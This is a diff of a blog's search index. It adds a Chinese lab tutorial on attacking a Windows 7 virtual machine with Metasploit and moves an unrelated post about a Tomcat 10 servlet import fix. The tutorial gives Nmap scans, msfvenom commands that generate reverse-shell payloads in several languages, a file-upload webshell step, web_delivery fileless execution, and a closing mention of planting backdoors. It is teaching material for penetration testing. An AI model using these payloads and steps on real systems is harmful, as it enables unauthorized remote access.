@@ -168,37 +168,156 @@
       </tags>
   </entry>
   <entry>
-    <title>Servlet实例化异常解决办法</title>
-    <url>/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
-    <content><![CDATA[<h1 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h1><blockquote>
-<p>系统环境：IDEA 2021.2，Tomcat 10</p>
+    <title>Metasploit渗透Windows实战</title>
+    <url>/2023/07/21/Metasploit%E6%B8%97%E9%80%8FWindows%E5%AE%9E%E6%88%98/</url>
+    <content><![CDATA[<blockquote>
+<p>前言：关于什么是Metasploit以及怎么用Metasploit可以转到<a href="https://hybbwuxidixi.github.io/2023/04/01/%E5%88%9D%E5%A7%8BMetasploit/">Kali - 初识Metasploit | 岚曦 ‘ s Blog</a></p>
+<p>测试环境：</p>
+<ul>
+<li><p>攻击机：Kali 2023.1</p>
+<ul>
+<li>IP : 192.168.237.129</li>
+</ul>
+</li>
+<li><p>靶机：Windows 7 旗舰版 （内部版本7601）</p>
+<ul>
+<li>IP : 192.168.237.128</li>
+</ul>
+</li>
+</ul>
 </blockquote>
-<p>  在IDEA中配置好Servlet文件路径，项目结构如下：<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-10-12.png"></p>
-<p>Tomcat配置如下：<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-11-18.png"></p>
-<p>以ch07_8_tijiao.jsp为例，运行后第一个界面显示正常<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-22-36.png"></p>
-<p>但当输入2个数据并点击提交后，servlet出现实例化异常<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-24-22.png"></p>
-<h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><p>项目结构’web-lib’中导入Tomcat的Tomcat-api.jar包以及servlet-api.jar包，并导入进项目库中</p>
-<div align="center">
-
-<p><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-28-44.png"></p>
-</div>
-
-<p>如果Tomcat版本为10.0以下时，做完上面步骤问题消失，可以正常运行，<br>但当Tomcat版本为10.0时，仍然会显示实例化异常，<br>根本原因是Tomcat 10的servlet-api中并非旧版本的javax.servlet，而是jakarta.servlet，<br>此时需要将项目src目录下的java源文件中import javax.servlet全部改为jakarta.servlet，保存后即可正常运行</p>
+<h1 id="确定攻击目标，收集靶机数据"><a href="#确定攻击目标，收集靶机数据" class="headerlink" title="确定攻击目标，收集靶机数据"></a>确定攻击目标，收集靶机数据</h1><p>在任何攻击前，都需要明确此次攻击的目标以及目标的相关信息。通过信息收集可以获得目标的 <strong>IP 地址</strong>、<strong>开放端口</strong>、<strong>系统版本</strong>、<strong>开放服务</strong>等信息，做好攻击前的信息收集有助于后续的操作。</p>
+<p>此次攻击的前提是已知靶机 IP 地址为192.168.237.128，可以使用 Nmap 等工具对靶机的其他信息进行收集。</p>
+<p>Metasploit 内自带 Nmap，使用指令：<code>db_nmap -sV -T4 192.168.237.128</code> 扫描靶机，返回结果如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211642509.png"></p>
+<p>可以看到开放的端口有135、139、445以及 RPC 服务的端口，主机名为 WIN-4JCVTB0CI4S，操作系统为 Windows。在目标主机具体IP不明确的情况下可以使用 <code>db_nmap -sP 192.168.237.0/24</code> 对整个网段进行扫描，返回网段内存活的所有主机 IP。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211649957.png"></p>
+<p>使用参数-sV的情况下，此次扫描整体耗时1分钟，相对来说比较慢。这时可以在获取存活主机 IP后再使用 <code>db_nmap -sS -T4 192.168.237.128</code> 对目标主机的端口进行半开放扫描以加快扫描速度。</p>
 <blockquote>
-<p>源代码：</p>
+<p>Nmap 常用参数及解释：</p>
+<p>nmap -sU -p 扫描指定的UDP端口 也可以去掉-P 对主机进行UDP端口扫描</p>
+<p>nmap -sT -p 扫描指定的UDP端口 也可以去掉-P 对主机进行TCP端口扫描</p>
+<p>nmap -sP 侦测在线主机、扫描MAC</p>
+<p>nmap -sL &lt;ip&#x2F;CIDR地址块&gt; 检测网络内所有主机名称，不对主机端口进行侦测</p>
+<p>nmap –sS 使用SYN扫描（-sS），该选项也称为“半开连接”或者“SYN stealth”。nmap发送syn包后等待回应，如果接收SYS&#x2F;ACK包说明端口开放，如果收到RST包，说明端口关闭；如果没有回应或者回应icmp不可达错误消息，则说明端口被过滤</p>
+<p>nmap -O 探测目标主机操作系统版本</p>
 </blockquote>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br></pre></td></tr></table></figure>
-
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211654065.png"></p>
+<p>获取到目标的 IP , OS , PORT , SERVICE 后就可以开始渗透。</p>
+<h1 id="搜索端口漏洞，开启本地监听"><a href="#搜索端口漏洞，开启本地监听" class="headerlink" title="搜索端口漏洞，开启本地监听"></a>搜索端口漏洞，开启本地监听</h1><p>通过根据上个阶段获取的开放端口搜索端口存在的漏洞，使用 <code>search</code> 指令进行搜索，用法如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211703097.png"></p>
+<p>假设攻击445端口，445端口最著名的漏洞即“永恒之蓝”漏洞 MS17_010，使用 <code>search ms17_010</code> 即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211709286.png"></p>
+<p>可以看到有多个模块可供使用，包括 exploit（攻击模块），auxiliary（辅助模块）等。对于如何攻击445端口可见：<a href="https://hybbwuxidixi.github.io/2023/04/01/%E5%88%9D%E5%A7%8BMetasploit/">Kali - 初识Metasploit | 岚曦 ‘ s Blog</a>，本文进行的攻击针对目标主机的80端口Web服务（目标主机需开启Web服务，端口不一定为80，视情况而定）。</p>
+<p>使用msfvenom创建载荷（payload）</p>
 <blockquote>
-<p>修改后：</p>
+<p>常见参数：</p>
+<p>-l, –list <type> 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,……all</type></p>
+<p>-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</p>
+<p>-f, –format &lt; format&gt; 指定输出格式</p>
+<p>-e, –encoder <encoder> 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</encoder></p>
+<p>-a, –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 还是 x64 还是 x86_64</p>
+<p>-o, –out &lt; path&gt; 指定创建好的payload的存放位置</p>
+<p>-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符。例如：不使用 ‘\x0f’、’\x00’</p>
+<p>-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</p>
+<p>-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</p>
+<p>-i, –iterations &lt; count&gt; 指定payload的编码次数</p>
+<p>-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</p>
+<p>-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</p>
+<p>-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</p>
+<p>-v, –var-name &lt; value&gt; 指定一个自定义的变量，以确定输出格式</p>
+<p>-t, –timeout <second> 从stdin读取有效负载时等待的秒数（默认为30，0表示禁用）</second></p>
+<p>-h,–help 查看帮助选项</p>
+<p>–platform &lt; platform&gt; 指定payload的目标平台</p>
 </blockquote>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br></pre></td></tr></table></figure>
+<p>例如输入命令 <code>msfvenom -l payloads -a x64 | grep windows</code> 先看下64位windows payload ：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211736547.png"></p>
+<p>选择 windows&#x2F;meterpreter&#x2F;reverse_tcp 作为payload（在 msf 中还包含 bind_tcp、reverse_http、bind_tcp，区别如下）</p>
+<blockquote>
+<p>Tips：</p>
+<p>reverse_tcp：攻击机设置一个端口（LPORT）和IP（LHOST），Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经连接。</p>
+<p>bind_tcp：攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入。</p>
+<p>采用reverse的方法一般较为安全，因为是在测试机连接攻击机，所以一般不会被防火墙发现；而bind在测试机打开端口时很容易被安全软件和防火墙发现。</p>
+</blockquote>
+<p>在生成攻击 payload 之前需要攻击机打开监听器以监听目标主机的上线。使用如下指令：</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost</span> 监听<span class="comment">ip</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport</span> 监听端口</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-27-19-25-20.png"><br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-50-35.png"><br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-50-59.png"></p>
+<p>在执行完 <code>set payload windows/meterpreter/reverse_tcp</code> 后可使用 show options 查看监听器 payload 所需设置的选项，可以看到现在需要设置 LHOST（监听机本地IP），LPORT 也可以设置成其他端口。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211823916.png"></p>
+<p>设置完成后可以发现已经开始监听（如果下文中的攻击 payload 和监听 payload 不一致，需修改监听 payload 再运行！！）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211826578.png"></p>
+<h1 id="确定攻击方式，执行攻击载荷"><a href="#确定攻击方式，执行攻击载荷" class="headerlink" title="确定攻击方式，执行攻击载荷"></a>确定攻击方式，执行攻击载荷</h1><h2 id="上传木马文件方式"><a href="#上传木马文件方式" class="headerlink" title="上传木马文件方式"></a>上传木马文件方式</h2><h3 id="Web-Payload"><a href="#Web-Payload" class="headerlink" title="Web Payload"></a>Web Payload</h3><p>假设目标主机的WEB服务存在一个文件上传漏洞，可以通过这个漏洞上传木马文件，只要能访问到上传的木马文件就可以拿到 session。此时可以创建Web payload，通过生成web文件再上传到目标主机的方式获取 session。</p>
+<p>Web payload有多种生成方式，包括：</p>
+<ul>
+<li>php</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">lhost</span>=监听ip <span class="attribute">lport</span>=监听端口 -f<span class="built_in"> raw </span>-o /root/desktop/shell.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>aspx</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=监听ip <span class="attribute">LPORT</span>=监听端口 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>jsp</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=监听ip <span class="attribute">LPORT</span>=监听端口 -f<span class="built_in"> raw </span>&gt; shell.jsp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>war</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=监听ip <span class="attribute">LPORT</span>=监听端口 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>
+
+<p>以 php 为例，在攻击机输入对应指令后会生成一个 shell.php，参数 -f raw 表示生成未经处理的格式，-o 表示指定输出路径，注意指令中的 lhost 和 lport 必须和监听器中的 lhost，lport 一致：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211851982.png"></p>
+<p><strong>扩展：meterpreter_reverse_tcp（stageless） 与 mererpreter&#x2F;reverse_tcp（stage） 的区别</strong></p>
+<p>在 msf 中存在这两种 payload，写法上区别为 “__” 与 “&#x2F;” ，实际上这两者的区别为 meterpreter_reverse_tcp 包含攻击所需的所有内容，相当于“大马”，容易被发现和拦截，而 mererpreter&#x2F;reverse_tcp 只为了攻击机和目标主机之间建立连接，后续的攻击动作会传递给 reverse_tcp 进行。</p>
+<p>在创建完 php 文件后，攻击机访问目标主机站点，通过存在文件上传漏洞的页面将 php 文件上传上去：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211903843.png"></p>
+<p>检查目标主机的目录，shell.php 已经被上传上去了，攻击机只要访问到这个文件即可完成session 的建立（这里攻击 payload 为 php&#x2F;meterpreter_reverse_tcp，需修改监听payload为相同 payload）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211914973.png"></p>
+<p>可以看到已经进入了 meterpreter 后渗透模块，输入？查看可以执行的操作：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211916710.png"></p>
+<h3 id="Scripts-Payload"><a href="#Scripts-Payload" class="headerlink" title="Scripts Payload"></a>Scripts Payload</h3><p>除了 web 文件以外还可以生成脚本文件，包括 python、bash、perl 等。用法和web文件相似：</p>
+<ul>
+<li>python</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=监听ip <span class="attribute">LPORT</span>=监听端口 -f<span class="built_in"> raw </span>&gt; shell.py</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>bash</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash <span class="attribute">LHOST</span>=监听ip <span class="attribute">LPORT</span>=监听端口 -f<span class="built_in"> raw </span>&gt; shell.sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>perl</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST= <span class="attribute">LPORT</span>=监听端口 -f<span class="built_in"> raw </span>&gt; shell.pl</span><br></pre></td></tr></table></figure>
+
+<p>这里就不做展示了，只要目标主机执行到这些脚本即可建立 session。</p>
+<h2 id="不上传木马文件方式"><a href="#不上传木马文件方式" class="headerlink" title="不上传木马文件方式"></a>不上传木马文件方式</h2><p>上传木马的方法有很大的局限性，首先需要通过漏洞将文件上传到目标主机，还需要目标主机执行，而不上传文件的方式则更好操作，这里运用到 web_delivery 模块，需要目标主机存在远程执行命令漏洞，这个模块不需要依赖文件，而是直接执行在目标主机的内存中，不易被发现。</p>
+<p>使用 msfvenom 生成 web_delivery 远程执行代码：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> uripath /</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> target 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lhost xxx</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>在 set target 时可以使用 show targets 查看可用的 target ，target 需和 payload 类型一致，不需要运行监听器。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211935394.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211936590.png"></p>
+<p>在有远程代码执行的主机上执行这段代码即可建立 session。注意：若目标主机未配置 php 的环境变量则无法执行这段代码，可以尝试其他 payload。</p>
+<p>以 python payload 为例，假设目标主机的网站存在远程代码执行漏洞，将生成的代码进行执行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211941222.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211942037.png"></p>
+<p>可以看到已经建立 session 了，依然使用 meterpreter 进行后渗透操作，包括查看各种信息（uid、pid、sysinfo 等）、执行系统指令（cd、ls、upload、shutdown 等）和其他操作。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211950757.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211950584.png"></p>
+<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>由于本文都是基于 webshell，权限较低，如果想要获得更高的权限做更多的事，可以通过webshell植入后门，再通过后门提权。</p>
 ]]></content>
       <categories>
-        <category>Java EE</category>
+        <category>网络安全</category>
       </categories>
+      <tags>
+        <tag>metasploit</tag>
+        <tag>渗透测试</tag>
+      </tags>
   </entry>
   <entry>
     <title>XSS详解</title>
@@ -242,6 +361,39 @@
         <tag>XSS</tag>
         <tag>OWASP-TOP10</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Servlet实例化异常解决办法</title>
+    <url>/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
+    <content><![CDATA[<h1 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h1><blockquote>
+<p>系统环境：IDEA 2021.2，Tomcat 10</p>
+</blockquote>
+<p>  在IDEA中配置好Servlet文件路径，项目结构如下：<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-10-12.png"></p>
+<p>Tomcat配置如下：<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-11-18.png"></p>
+<p>以ch07_8_tijiao.jsp为例，运行后第一个界面显示正常<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-22-36.png"></p>
+<p>但当输入2个数据并点击提交后，servlet出现实例化异常<br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-24-22.png"></p>
+<h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><p>项目结构’web-lib’中导入Tomcat的Tomcat-api.jar包以及servlet-api.jar包，并导入进项目库中</p>
+<div align="center">
+
+<p><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-28-44.png"></p>
+</div>
+
+<p>如果Tomcat版本为10.0以下时，做完上面步骤问题消失，可以正常运行，<br>但当Tomcat版本为10.0时，仍然会显示实例化异常，<br>根本原因是Tomcat 10的servlet-api中并非旧版本的javax.servlet，而是jakarta.servlet，<br>此时需要将项目src目录下的java源文件中import javax.servlet全部改为jakarta.servlet，保存后即可正常运行</p>
+<blockquote>
+<p>源代码：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>修改后：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-27-19-25-20.png"><br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-50-35.png"><br><img src="/2022/09/26/Servlet%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%BC%82%E5%B8%B8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/2022-09-26-22-50-59.png"></p>
+]]></content>
+      <categories>
+        <category>Java EE</category>
+      </categories>
   </entry>
   <entry>
     <title>Hello World</title>
